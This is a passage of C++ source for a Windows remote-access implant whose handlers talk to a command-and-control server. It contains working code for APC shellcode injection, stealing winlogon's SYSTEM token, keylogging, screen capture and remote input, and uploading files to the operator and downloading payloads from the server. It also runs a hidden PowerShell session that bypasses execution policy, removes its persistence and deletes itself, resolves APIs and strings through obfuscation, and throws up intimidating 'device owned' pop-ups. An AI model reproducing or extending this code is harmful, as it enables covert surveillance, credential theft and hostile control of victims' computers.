    BOOL ok = InjectViaApc(pid, sc.data(), sc.size());
    return ok ? L"[+] APC queued " + std::to_wstring(sc.size()) + L" bytes into pid=" + std::to_wstring(pid)
              : L"[error: APC injection failed]";
}

static std::wstring HandlePs(const std::string& /*args*/) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot failed]";
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    std::wstring out = L"PID      PPID     NAME\n";
    out += L"-------- -------- ------------------------\n";
    if (Process32FirstW(snap, &pe)) {
        do {
            wchar_t line[320]; // MAX_PATH(260) + pid fields + newline
            swprintf_s(line, L"%-8lu %-8lu %s\n",
                       pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
            out += line;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}

static std::wstring HandleDownload(const std::string& args) {
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return L"Usage: download <url> <dest>";
    std::string url  = args.substr(0, sp);
    std::string dest = args.substr(sp + 1);
    while (!dest.empty() && dest.front() == ' ') dest.erase(0, 1);
    if (url.empty() || dest.empty()) return L"Usage: download <url> <dest>";

    HttpResponse r = WinHttpDownload(UTF8ToWString(url));
    if (r.status == 0) return L"[error: request failed]";
    if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";

    std::wstring wDest = UTF8ToWString(dest);
    HANDLE hf = CreateFileW(wDest.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE)
        return L"[error: cannot write " + wDest + L"]";
    DWORD wr = 0;
    WriteFile(hf, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr);
    CloseHandle(hf);
    return L"[+] Downloaded " + std::to_wstring(wr) + L" bytes → " + wDest;
}

static std::wstring HandleUpload(const std::string& args) {
    if (args.empty()) return L"Usage: upload <path>";
    std::wstring wPath = UTF8ToWString(args);
    HANDLE hf = CreateFileW(wPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return L"[error: cannot open " + wPath + L"]";
    LARGE_INTEGER fsz = {};
    GetFileSizeEx(hf, &fsz);
    if (fsz.QuadPart > 10 * 1024 * 1024) { CloseHandle(hf); return L"[error: file > 10 MB]"; }
    std::vector<BYTE> buf(static_cast<size_t>(fsz.QuadPart));
    DWORD rd = 0;
    ReadFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &rd, nullptr);
    CloseHandle(hf);
    std::string b64 = Base64Encode(buf.data(), rd);
    // filename from path
    size_t sl = args.find_last_of("/\\");
    std::string fname = (sl == std::string::npos) ? args : args.substr(sl + 1);
    return L"[UPLOAD:" + UTF8ToWString(fname) + L"]\n" + UTF8ToWString(b64);
}

// ─── File browser ────────────────────────────────────────────────────────────
static std::wstring JsonEscapeW(const std::wstring& s) {
    std::wstring out;
    out.reserve(s.size() + 8);
    for (wchar_t c : s) {
        switch (c) {
            case L'"':  out += L"\\\""; break;
            case L'\\': out += L"\\\\"; break;
            case L'\n': out += L"\\n";  break;
            case L'\r': out += L"\\r";  break;
            case L'\t': out += L"\\t";  break;
            default:    out += c;       break;
        }
    }
    return out;
}

// `!files`          → [DRIVES] + JSON array of drive letters
// `!files <path>`   → [FILES] + JSON array [{n,s,d,m}] (500-entry cap)
static std::wstring HandleFiles(const std::string& args) {
    std::wstring path = UTF8ToWString(args);
    size_t a = path.find_first_not_of(L" \t\"");
    if (a == std::wstring::npos) {
        wchar_t buf[1024] = {};
        GetLogicalDriveStringsW(1023, buf);
        std::wstring out = L"[DRIVES]\n[";
        bool first = true;
        for (wchar_t* p = buf; *p; p += 4) {
            if (!first) out += L",";
            out += L"\"" + JsonEscapeW(p) + L"\"";
            first = false;
        }
        return out + L"]";
    }
    size_t b = path.find_last_not_of(L" \t\"");
    path = path.substr(a, b - a + 1);
    if (path.back() != L'\\' && path.back() != L'/') path += L"\\";
    std::wstring spec = path + L"*";

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(spec.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE)
        return L"[error: cannot list " + path + L"]";

    std::wstring out = L"[FILES]\n[";
    int count = 0;
    bool trunc = false, first = true;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0)
            continue;
        if (count >= 500) { trunc = true; break; }
        if (!first) out += L",";
        first = false;
        ULONGLONG size = (static_cast<ULONGLONG>(fd.nFileSizeHigh) << 32) | fd.nFileSizeLow;
        ULARGE_INTEGER li;
        li.HighPart = fd.ftLastWriteTime.dwHighDateTime;
        li.LowPart  = fd.ftLastWriteTime.dwLowDateTime;
        ULONGLONG epoch = li.QuadPart / 10000000ULL - 11644473600ULL;
        out += L"{\"n\":\"" + JsonEscapeW(fd.cFileName) +
               L"\",\"s\":" + std::to_wstring(size) +
               L",\"d\":" + ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? L"1" : L"0") +
               L",\"m\":" + std::to_wstring(epoch) + L"}";
        ++count;
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    if (trunc) out += (first ? L"" : L",") + std::wstring(L"{\"n\":\"__truncated__\",\"s\":0,\"d\":0,\"m\":0}");
    return out + L"]";
}

// `!getfile <dest>` — write the payload staged on the server to a local file.
// The /payload GET is beacon-authenticated with this session's ID.
static std::wstring HandleGetFile(const std::string& args) {
    if (args.empty()) return L"Usage: !getfile <dest path>";
    std::wstring dest = UTF8ToWString(args);
    HttpResponse r = WinHttpRequest(GetC2Host(), config::C2_PORT, L"GET", L"/payload", "",
                                    L"X-Session-ID: " + g_SessionId);
    if (r.status == 404) return L"[error: no payload staged on server]";
    if (r.status != 200) return L"[error: HTTP " + std::to_wstring(r.status) + L"]";
    HANDLE hf = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE)
        return L"[error: cannot write " + dest + L"]";
    DWORD wr = 0;
    WriteFile(hf, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr);
    CloseHandle(hf);
    return L"[+] wrote " + std::to_wstring(wr) + L" bytes → " + dest;
}

static std::wstring HandleStealToken(const std::string& /*args*/) {
    // Find winlogon.exe and duplicate its token
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return L"[error: snapshot]";
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    DWORD winlogonPid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                winlogonPid = pe.th32ProcessID; break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!winlogonPid) return L"[error: winlogon.exe not found]";

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProc) return L"[error: OpenProcess pid=" + std::to_wstring(winlogonPid)
                       + L" err=" + std::to_wstring(GetLastError()) + L"]";
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        return L"[error: OpenProcessToken err=" + std::to_wstring(GetLastError()) + L"]";
    }
    CloseHandle(hProc);

    HANDLE hDup = nullptr;
    BOOL ok = DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
                               SecurityImpersonation, TokenPrimary, &hDup);
    CloseHandle(hTok);
    if (!ok) return L"[error: DuplicateTokenEx err=" + std::to_wstring(GetLastError()) + L"]";

    if (g_StolenToken) CloseHandle(g_StolenToken);
    g_StolenToken = hDup;
    ImpersonateLoggedOnUser(g_StolenToken);
    return L"[+] Token stolen from winlogon.exe (pid=" + std::to_wstring(winlogonPid) + L"), impersonating SYSTEM";
}

static std::wstring HandleSleepCmd(const std::string& args) {
    if (args.empty()) return L"Usage: sleep <seconds>";
    int secs = atoi(args.c_str());
    if (secs < 1) return L"[error: seconds must be >= 1]";
    g_BeaconOverride = static_cast<DWORD>(secs);
    return L"[+] Beacon interval set to " + std::to_wstring(secs) + L"s";
}

static std::wstring HandleShellMode(const std::string& args) {
    if (args == "off" || args == "0") {
        g_BeaconOverride = 0;
        return L"[+] Shell mode off — beacon back to default interval";
    }
    g_BeaconOverride = 1; // 1s rapid-poll for interactive shell
    return L"[+] Shell mode on — beacon at 1s, type commands freely; !shell off to reset";
}

static std::wstring HandleKeylogStart(const std::string& /*args*/) {
    if (KeylogRunning()) return L"[keylog: already running]";
    KeylogStart();
    return KeylogRunning() ? L"[+] Keylogger started" : L"[error: failed to install hook]";
}

static std::wstring HandleKeylogDump(const std::string& /*args*/) {
    if (!KeylogRunning()) return L"[keylog: not running — use keylog_start first]";
    return KeylogDump();
}

static std::wstring HandleKeylogStop(const std::string& /*args*/) {
    if (!KeylogRunning()) return L"[keylog: not running]";
    KeylogStop();
    return L"[+] Keylogger stopped";
}

// ─── Full uninstall — kill persistence, then exit for good ───────────────────
static std::wstring HandleUninstall(const std::string& /*args*/) {
    wchar_t selfPath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
    std::wstring out;
    out += RemoveWmiPersistence() ? L"[+] WMI persistence removed\n"
                                  : L"[-] WMI cleanup failed\n";
    out += RemoveScheduledTaskPersistence() ? L"[+] Scheduled task removed\n"
                                            : L"[-] Scheduled task removal failed\n";
    // Run keys (HKCU always; HKLM when elevated)
    auto hAdv = GetModuleHandleA(XS("advapi32.dll"));
    if (hAdv) {
        auto _RegOpenKeyExW  = HASHPROC(hAdv, RegOpenKeyExW);
        auto _RegDeleteValueW = HASHPROC(hAdv, RegDeleteValueW);
        auto _RegCloseKey    = HASHPROC(hAdv, RegCloseKey);
        wchar_t runKeyStr[80] = {};
        { auto tmp = XSW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
          wcsncpy_s(runKeyStr, tmp.str(), _TRUNCATE); }
        auto delRun = [&](HKEY root) {
            HKEY h = nullptr;
            if (_RegOpenKeyExW && _RegDeleteValueW && _RegCloseKey &&
                _RegOpenKeyExW(root, runKeyStr, 0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
                _RegDeleteValueW(h, L"WindowsStorageService");
                _RegCloseKey(h);
                return true;
            }
            return false;
        };
        out += delRun(HKEY_CURRENT_USER) ? L"[+] HKCU Run value removed\n"
                                         : L"[-] HKCU Run value not found\n";
        if (IsElevated())
            out += delRun(HKEY_LOCAL_MACHINE) ? L"[+] HKLM Run value removed\n"
                                              : L"[-] HKLM Run value not found\n";
    }
    // Self-delete, then exit for good
    std::wstring delCmd = L"cmd.exe /c ping -n 3 127.0.0.1 >nul & del /f /q \""
                        + std::wstring(selfPath) + L"\"";
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    CreateProcessW(nullptr, &delCmd[0], nullptr, nullptr, FALSE,
                   CREATE_NO_WINDOW | DETACHED_PROCESS, nullptr, nullptr, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    out += L"[+] uninstall complete — implant exits and self-deletes";
    g_MigrateExit = 1;  // reuse the clean-exit sentinel → BeaconLoop returns 0xDEAD
    return out;
}

// =====================================================================
//  SCREENSHOT — GDI full-screen capture → BMP → base64
// =====================================================================
static std::wstring HandleScreenshot(const std::string& args) {
    try {
        // Optional scale percent (15..100) — smaller frames stream faster.
        int scale = 100;
        if (!args.empty()) {
            scale = atoi(args.c_str());
            if (scale < 15) scale = 15;
            if (scale > 100) scale = 100;
        }
        HDC hdcScreen = GetDC(NULL);
        if (!hdcScreen) return L"[error: GetDC failed]";

        int cx = GetSystemMetrics(SM_CXSCREEN);
        int cy = GetSystemMetrics(SM_CYSCREEN);
        int sw = cx * scale / 100;
        int sh = cy * scale / 100;
        if (sw < 1) sw = 1;
        if (sh < 1) sh = 1;

        HDC     hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hbmp   = CreateCompatibleBitmap(hdcScreen, sw, sh);
        if (!hdcMem || !hbmp) {
            if (hdcMem) DeleteDC(hdcMem);
            if (hbmp)   DeleteObject(hbmp);
            ReleaseDC(NULL, hdcScreen);
            return L"[error: CreateCompatibleBitmap failed]";
        }

        HBITMAP hOld = static_cast<HBITMAP>(SelectObject(hdcMem, hbmp));
        if (sw == cx && sh == cy)
            BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
        else
            StretchBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, cx, cy, SRCCOPY | CAPTUREBLT);
        SelectObject(hdcMem, hOld);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);

        BITMAPINFOHEADER bi = {};
        bi.biSize        = sizeof(BITMAPINFOHEADER);
        bi.biWidth       = sw;
        bi.biHeight      = -sh;
        bi.biPlanes      = 1;
        bi.biBitCount    = 24;
        bi.biCompression = BI_RGB;
        DWORD rowBytes   = ((static_cast<DWORD>(sw) * 3 + 3) & ~3u);
        bi.biSizeImage   = rowBytes * static_cast<DWORD>(sh);

        std::vector<BYTE> pixels(bi.biSizeImage);
        HDC hdcTmp = GetDC(NULL);
        GetDIBits(hdcTmp, hbmp, 0, static_cast<UINT>(sh),
                  pixels.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
        ReleaseDC(NULL, hdcTmp);
        DeleteObject(hbmp);

        BITMAPFILEHEADER bfh = {};
        bfh.bfType    = 0x4D42;
        bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bfh.bfSize    = bfh.bfOffBits + bi.biSizeImage;

        std::vector<BYTE> bmpFile(bfh.bfSize);
        memcpy(bmpFile.data(),                 &bfh, sizeof(bfh));
        memcpy(bmpFile.data() + sizeof(bfh),   &bi,  sizeof(bi));
        memcpy(bmpFile.data() + bfh.bfOffBits, pixels.data(), pixels.size());

        // Free pixel buffer before base64 to reduce peak memory usage
        pixels.clear();
        pixels.shrink_to_fit();

        std::string b64 = Base64Encode(bmpFile.data(), static_cast<DWORD>(bmpFile.size()));
        bmpFile.clear();
        bmpFile.shrink_to_fit();

        return L"[SCREENSHOT:BMP]\n" + UTF8ToWString(b64);
    } catch (...) {
        return L"[error: screenshot OOM or GDI failure]";
    }
}

// =====================================================================
//  LIVE VIEW — inject mouse (optional) and capture a scaled frame in a
//  single task, so one beacon per frame is enough for the operator's
//  browser-based interactive remote control.
// =====================================================================
static std::wstring HandleLive(const std::string& args) {
    int scale = 50, nx = -1, ny = -1, btns = 0;
    sscanf(args.c_str(), "%d %d %d %d", &scale, &nx, &ny, &btns);
    if (nx >= 0 && ny >= 0)
        VncInjectMouseNorm(nx, ny, btns);
    return HandleScreenshot(std::to_string(scale));
}

// =====================================================================
//  INPUT — inject mouse/keyboard events from the operator's live view.
//    !input m <nx> <ny> <btns>   normalized 0..10000 coords, btns bitmask
//    !input k <vk> <down>        Win32 virtual-key code
// =====================================================================
static std::wstring HandleInput(const std::string& args) {
    if (args.rfind("m ", 0) == 0) {
        int nx = 0, ny = 0, b = 0;
        if (sscanf(args.c_str() + 2, "%d %d %d", &nx, &ny, &b) == 3) {
            VncInjectMouseNorm(nx, ny, b);
            return L"[+] input";
        }
        return L"[error: bad mouse args]";
    }
    if (args.rfind("k ", 0) == 0) {
        int vk = 0, d = 0;
        if (sscanf(args.c_str() + 2, "%d %d", &vk, &d) == 2) {
            VncInjectKeyVk(vk, d != 0);
            return L"[+] input";
        }
        return L"[error: bad key args]";
    }
    return L"Usage: !input m <nx> <ny> <btns> | !input k <vk> <down>";
}

// =====================================================================
//  PERSISTENT POWERSHELL — one hidden powershell.exe stays alive on the
//  target; `ps1 <line>` feeds it a line and returns the output. State
//  (variables, modules, Set-Location) persists across tasks.
// =====================================================================
extern std::wstring g_ShellCwd;      // defined with the shell-state helpers
void InitShellCwd();

static HANDLE g_psProc = nullptr;
static HANDLE g_psWrite = nullptr, g_psRead = nullptr;

static void PsKill() {
    if (g_psProc) { TerminateProcess(g_psProc, 1); CloseHandle(g_psProc); g_psProc = nullptr; }
    if (g_psWrite) { CloseHandle(g_psWrite); g_psWrite = nullptr; }
    if (g_psRead)  { CloseHandle(g_psRead);  g_psRead = nullptr; }
}

static std::string PsDrain(DWORD maxMs, DWORD idleMs) {
    std::string out; char buf[4096]; DWORD rd = 0;
    DWORD t0 = GetTickCount(), lastData = GetTickCount();
    while (GetTickCount() - t0 < maxMs && out.size() < config::CMD_OUTPUT_MAX) {
        DWORD avail = 0;
        if (!PeekNamedPipe(g_psRead, nullptr, 0, nullptr, &avail, nullptr)) break;
        if (avail == 0) {
            if (GetTickCount() - lastData >= idleMs) break;
            Sleep(80); continue;
        }
        if (!ReadFile(g_psRead, buf, (avail < sizeof(buf)) ? avail : sizeof(buf), &rd, nullptr) || rd == 0)
            break;
        out.append(buf, rd);
        lastData = GetTickCount();
    }
    return out;
}

static bool PsSpawn() {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring cmd = L"\"" + std::wstring(sysRoot) +
        L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\""
        L" -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -";

    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE inR = nullptr, inW = nullptr, outR = nullptr, outW = nullptr;
    if (!CreatePipe(&outR, &outW, &sa, 0)) return false;
    if (!CreatePipe(&inR, &inW, &sa, 0)) {
        CloseHandle(outR); CloseHandle(outW); return false;
    }
    SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = inR;
    si.hStdOutput = outW;
    si.hStdError  = outW;

    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(inR);
    CloseHandle(outW);
    if (!ok) { CloseHandle(inW); CloseHandle(outR); return false; }
    CloseHandle(pi.hThread);
    g_psProc = pi.hProcess; g_psWrite = inW; g_psRead = outR;

    // UTF-8 output + start in the implant's tracked working directory
    InitShellCwd();
    std::string initUtf8 = WStringToUTF8(
        L"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\n"
        L"try{Set-Location -LiteralPath '" + g_ShellCwd + L"'}catch{}\n");
    DWORD w = 0;
    WriteFile(g_psWrite, initUtf8.data(), (DWORD)initUtf8.size(), &w, nullptr);
    PsDrain(3000, 600);
    return true;
}

static std::wstring HandlePsLine(const std::string& args) {
    if (args.empty())
        return L"Usage: ps1 <line>  (persistent PowerShell — state survives; psreset restarts)";
    if (g_psProc) {
        DWORD code = 0;
        if (!GetExitCodeProcess(g_psProc, &code) || code != STILL_ACTIVE) PsKill();
    }
    if (!g_psProc && !PsSpawn())
        return L"[error: cannot start powershell]";

    std::string line = args + "\n";
    DWORD w = 0;
    if (!WriteFile(g_psWrite, line.data(), (DWORD)line.size(), &w, nullptr)) {
        PsKill();
        if (!PsSpawn()) return L"[error: powershell pipe broken, respawn failed]";
        if (!WriteFile(g_psWrite, line.data(), (DWORD)line.size(), &w, nullptr))
            return L"[error: powershell write failed]";
    }
    std::string out = PsDrain(config::CMD_TIMEOUT_MS, 900);
    return UTF8ToWString(out.empty() ? "[no output]" : out);
}

static std::wstring HandlePsReset(const std::string&) {
    PsKill();
    return PsSpawn() ? L"[+] PowerShell session restarted" : L"[error: restart failed]";
}

// ─── Visibility demo — wallpaper + desktop note (fully reversible) ───────────
// !prank <text>   swap wallpaper to the embedded image, drop READ_ME.txt on
//                 the desktop, pop it in Notepad
// !prank off      restore the original wallpaper and remove the note
static bool WriteResourceToFile(UINT resId, const wchar_t* dest) {
    HRSRC hr = FindResourceW(nullptr, MAKEINTRESOURCEW(resId), RT_RCDATA);
    if (!hr) return false;
    HGLOBAL hg = LoadResource(nullptr, hr);
    if (!hg) return false;
    const BYTE* data = static_cast<const BYTE*>(LockResource(hg));
    DWORD size = SizeofResource(nullptr, hr);
    if (!data || !size) return false;
    HANDLE hf = CreateFileW(dest, GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    WriteFile(hf, data, size, &wr, nullptr);
    CloseHandle(hf);
    return wr == size;
}

static std::wstring HandlePrank(const std::string& args) {
    wchar_t pub[MAX_PATH] = {};
    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
        lstrcpyW(pub, L"C:\\Users\\Public");
    std::wstring wallPath = std::wstring(pub) + L"\\ghost_wall.jpg";
    std::wstring origPath = std::wstring(pub) + L"\\ghost_wall_orig.txt";

    // Restore mode — put the original wallpaper back and clean up.
    if (args == "off") {
        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf == INVALID_HANDLE_VALUE) return L"[error: no saved wallpaper to restore]";
        wchar_t orig[260] = {}; DWORD rd = 0;
        ReadFile(hf, orig, sizeof(orig) - 2, &rd, nullptr);
        CloseHandle(hf);
        if (!orig[0]) return L"[error: saved wallpaper path is empty]";
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (LPVOID)orig,
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        wchar_t desk[MAX_PATH] = {};
        SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
        DeleteFileW((std::wstring(desk) + L"\\READ_ME.txt").c_str());
        DeleteFileW(origPath.c_str());
        DeleteFileW(wallPath.c_str());
        return L"[+] wallpaper restored, note removed";
    }

    // Save the current wallpaper once, so `off` can restore it later.
    if (GetFileAttributesW(origPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        wchar_t cur[260] = {}; DWORD sz = sizeof(cur) - 2;
        RegGetValueW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"Wallpaper",
                     RRF_RT_REG_SZ, nullptr, cur, &sz);
        HANDLE hf = CreateFileW(origPath.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD w = 0;
            WriteFile(hf, cur, static_cast<DWORD>(wcslen(cur) * 2), &w, nullptr);
            CloseHandle(hf);
        }
    }

    if (!WriteResourceToFile(100, wallPath.c_str()))
        return L"[error: wallpaper resource missing]";
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, &wallPath[0],
                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    // Desktop note — UTF-16 LE with BOM so Notepad renders it cleanly.
    wchar_t desk[MAX_PATH] = {};
    SHGetFolderPathW(nullptr, CSIDL_DESKTOP, nullptr, 0, desk);
    std::wstring note = std::wstring(desk) + L"\\READ_ME.txt";
    std::wstring text = UTF8ToWString(args);
    if (text.empty())
        text = L"YOUR DEVICE HAS BEEN OWNED.\r\nAll access was logged.\r\n\r\n- @kalidada";
    HANDLE hf = CreateFileW(note.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE)
        return L"[+] wallpaper set, but the note write failed";
    BYTE bom[2] = { 0xFF, 0xFE };
    DWORD w = 0;
    WriteFile(hf, bom, 2, &w, nullptr);
    WriteFile(hf, text.c_str(), static_cast<DWORD>(text.size() * 2), &w, nullptr);
    CloseHandle(hf);

    // Pop the note in Notepad for immediate visibility.
    std::wstring np = L"notepad.exe \"" + note + L"\"";
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    if (CreateProcessW(nullptr, &np[0], nullptr, nullptr, FALSE, 0,
                       nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    return L"[+] wallpaper set, READ_ME.txt on desktop — !prank off to revert";
}

// ─── Random popup chaos (visibility demo) ────────────────────────────────────
// !popups      open/close random scare popups at random screen positions
// !popups off  stop the loop and close whatever is open
static HANDLE g_popThread = nullptr;
static volatile LONG g_popRunning = 0;
static HANDLE g_lastPopProc = nullptr;
static HWND   g_lastPopWnd  = nullptr;

static const wchar_t* kPopTexts[] = {
    L"SYSTEM COMPROMISED\n\nEvery keystroke is being logged.",
    L"REMOTE ACCESS ACTIVE\n\n@kalidada is watching this screen.",
    L"ALERT: Camera and microphone are ON.",
    L"Your files are being copied right now.\nDo not turn off the computer.",
    L"CONNECTION INTERCEPTED\n\nAll saved passwords have been exported.",
    L"This machine belongs to @kalidada now.",
    L"Data exfiltration in progress… 67%",
    L"Firewall: OFF    Antivirus: BYPASSED\nYou are on your own.",
};

static DWORD PopRand(DWORD lo, DWORD hi) {
    static std::mt19937 gen(static_cast<unsigned>(
        std::random_device{}() ^ GetCurrentProcessId()));
    return lo + gen() % (hi - lo + 1);
}

static BOOL CALLBACK MovePopWnd(HWND hwnd, LPARAM pid) {
    DWORD wid = 0;
    GetWindowThreadProcessId(hwnd, &wid);
    if (wid == static_cast<DWORD>(pid)) {
        int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(hwnd, HWND_TOPMOST,
                     static_cast<int>(PopRand(0, sw > 500 ? sw - 500 : 100)),
                     static_cast<int>(PopRand(0, sh > 350 ? sh - 350 : 100)),
                     0, 0, SWP_NOSIZE | SWP_NOZORDER);
        g_lastPopWnd = hwnd;
        return FALSE;
    }
    return TRUE;
}

static DWORD WINAPI PopupThread(LPVOID) {
    DebugLog(L"[pop] thread started");
    wchar_t pub[MAX_PATH] = {};
    if (!GetEnvironmentVariableW(L"PUBLIC", pub, MAX_PATH))
        lstrcpyW(pub, L"C:\\Users\\Public");
    std::wstring notePath = std::wstring(pub) + L"\\ghost_pop.txt";

    while (InterlockedCompareExchange(&g_popRunning, 0, 0)) {
        // random idle gap — deadline-based so it can't wrap, sliced so
        // '!popups off' reacts within ~200 ms
        DebugLog(L"[pop] idle start");
        DWORD idleMs = PopRand(2500, 8000);
        DWORD idleDeadline = GetTickCount() + idleMs;
        while (g_popRunning &&
               static_cast<int>(idleDeadline - GetTickCount()) > 0)
            Sleep(200);
        DebugLog(L"[pop] idle done, opening popup");
        if (!g_popRunning) break;

        const wchar_t* txt = kPopTexts[PopRand(0, ARRAYSIZE(kPopTexts) - 1)];
        HANDLE hf = CreateFileW(notePath.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) { DebugLog(L"[pop] note write FAILED"); break; }
        BYTE bom[2] = { 0xFF, 0xFE }; DWORD w = 0;
        WriteFile(hf, bom, 2, &w, nullptr);
        WriteFile(hf, txt, static_cast<DWORD>(wcslen(txt) * 2), &w, nullptr);
        CloseHandle(hf);

        std::wstring cmd = L"notepad.exe \"" + notePath + L"\"";
        STARTUPINFOW si = {}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE, 0,
                            nullptr, nullptr, &si, &pi)) {
            DebugLog(L"[pop] CreateProcess FAILED err=" + std::to_wstring(GetLastError()));
            break;
        }
        DebugLog(L"[pop] notepad spawned");
        if (g_lastPopProc) CloseHandle(g_lastPopProc);
        g_lastPopProc = pi.hProcess;
        g_lastPopWnd  = nullptr;

        Sleep(350);  // let the window materialize
        if (g_popRunning)
            EnumWindows(MovePopWnd, static_cast<LPARAM>(pi.dwProcessId));

        // random lifetime, then close
        DWORD lifeDeadline = GetTickCount() + PopRand(2000, 6000);
        while (g_popRunning &&
               static_cast<int>(lifeDeadline - GetTickCount()) > 0)
            Sleep(200);
        if (g_lastPopWnd) PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
        if (WaitForSingleObject(pi.hProcess, 800) == WAIT_TIMEOUT)
            TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        if (g_lastPopProc == pi.hProcess) { g_lastPopProc = nullptr; g_lastPopWnd = nullptr; }
    }
    return 0;
}

static std::wstring HandlePopups(const std::string& args) {
    if (args == "off") {
        if (!g_popRunning) return L"[popups: not running]";
        InterlockedExchange(&g_popRunning, 0);
        if (g_popThread) {
            WaitForSingleObject(g_popThread, 10000);
            CloseHandle(g_popThread);
            g_popThread = nullptr;
        }
        if (g_lastPopWnd)  PostMessageW(g_lastPopWnd, WM_CLOSE, 0, 0);
        if (g_lastPopProc) { TerminateProcess(g_lastPopProc, 0); CloseHandle(g_lastPopProc); g_lastPopProc = nullptr; }
        g_lastPopWnd = nullptr;
        return L"[+] popups stopped";
    }
    if (g_popRunning) return L"[popups: already running — !popups off to stop]";
    InterlockedExchange(&g_popRunning, 1);
